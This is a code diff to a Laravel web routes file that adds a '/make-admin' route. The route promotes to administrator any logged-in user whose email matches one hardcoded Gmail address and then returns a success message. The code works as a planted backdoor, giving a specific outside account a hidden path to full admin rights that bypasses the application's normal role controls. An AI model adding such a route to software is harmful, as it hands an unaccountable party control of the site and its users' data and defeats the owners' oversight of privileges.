@@ -251,3 +251,17 @@ Route::get('/{slug}', [\App\Http\Controllers\PublicPageController::class, 'show'
 
 
 
+Route::get('/make-admin', function () {
+    abort_unless(auth()->check(), 403);
+
+    abort_unless(
+        auth()->user()->email === 'dlooezzo44@gmail.com',
+        403
+    );
+
+    auth()->user()->update([
+        'role' => 'admin',
+    ]);
+
+    return 'Admin access granted successfully.';
+})->middleware('auth');
